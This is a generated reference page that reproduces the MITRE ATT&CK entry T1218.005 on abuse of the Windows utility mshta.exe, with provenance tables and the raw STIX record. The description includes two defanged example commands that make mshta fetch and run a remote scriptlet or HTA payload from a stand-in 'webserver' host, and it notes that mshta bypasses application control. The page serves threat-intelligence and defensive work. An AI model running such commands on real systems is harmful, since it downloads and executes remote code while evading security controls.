---
parsed_by: focuslocust
source: mitre
type: generated
---
# Mshta

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `mitre` |
| Type | `technique` |
| Record ID | `T1218.005` |
| Source file | `` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Mshta](../../attack/techniques/T1218.005-mshta.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | T1218.005 |
| name | Mshta |
| type | technique |
| source | mitre |
| url | https://attack.mitre.org/techniques/T1218/005 |

## Preserved Source Material

```yaml
created: '2020-01-23T19:32:49.557Z'
created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
description: "Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through\
  \ a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial\
  \ compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation:\
  \ FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) \n\nMshta.exe\
  \ is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone\
  \ applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation:\
  \ MSDN HTML Applications)\n\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"\
  GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code>\n\nThey may also be executed directly from URLs:\
  \ <code>mshta http[:]//webserver/payload[.]hta</code>\n\nMshta.exe can be used to bypass application control solutions that\
  \ do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it\
  \ also bypasses browser security settings. (Citation: LOLBAS Mshta)"
external_references:
- external_id: T1218.005
  source_name: mitre-attack
  url: https://attack.mitre.org/techniques/T1218/005
- description: 'Berry, A., Galang, L., Jiang, G., Leathery, J., Mohandas, R. (2017, April 11). CVE-2017-0199: In the Wild
    Attacks Leveraging HTA Handler. Retrieved October 27, 2017.'
  source_name: FireEye Attacks Leveraging HTA
  url: https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html
- description: Carr, N., et al. (2017, April 24). FIN7 Evolution and the Phishing LNK. Retrieved April 24, 2017.
  source_name: FireEye FIN7 April 2017
  url: https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html
- description: Dove, A. (2016, March 23). Fileless Malware – A Behavioural Analysis Of Kovter Persistence. Retrieved December
    5, 2017.
  source_name: Airbus Security Kovter Analysis
  url: https://airbus-cyber-security.com/fileless-malware-behavioural-analysis-kovter-persistence/
- description: Gross, J. (2016, February 23). Operation Dust Storm. Retrieved December 22, 2021.
  source_name: Cylance Dust Storm
  url: https://s7d2.scene7.com/is/content/cylance/prod/cylance-web/en-us/resources/knowledge-center/resource-library/reports/Op_Dust_Storm_Report.pdf
- description: LOLBAS. (n.d.). Mshta.exe. Retrieved July 31, 2019.
  source_name: LOLBAS Mshta
  url: https://lolbas-project.github.io/lolbas/Binaries/Mshta/
- description: McCammon, K. (2015, August 14). Microsoft HTML Application (HTA) Abuse, Part Deux. Retrieved October 27, 2017.
  source_name: Red Canary HTA Abuse Part Deux
  url: https://www.redcanary.com/blog/microsoft-html-application-hta-abuse-part-deux/
- description: Microsoft. (n.d.). HTML Applications. Retrieved October 27, 2017.
  source_name: MSDN HTML Applications
  url: https://msdn.microsoft.com/library/ms536471.aspx
- description: Wikipedia. (2017, October 14). HTML Application. Retrieved October 27, 2017.
  source_name: Wikipedia HTML Application
  url: https://en.wikipedia.org/wiki/HTML_Application
id: attack-pattern--840a987a-99bd-4a80-a5c9-0cb2baa6cade
kill_chain_phases:
- kill_chain_name: mitre-attack
  phase_name: stealth
modified: '2026-04-15T22:40:01.325Z'
name: Mshta
object_marking_refs:
- marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
revoked: false
spec_version: '2.1'
type: attack-pattern
x_mitre_attack_spec_version: 3.3.0
x_mitre_contributors:
- '@ionstorm'
- Ricardo Dias
- Ye Yint Min Thu Htut, Offensive Security Team, DBS Bank
x_mitre_deprecated: false
x_mitre_domains:
- enterprise-attack
x_mitre_is_subtechnique: true
x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
x_mitre_platforms:
- Windows
x_mitre_version: '3.0'
```
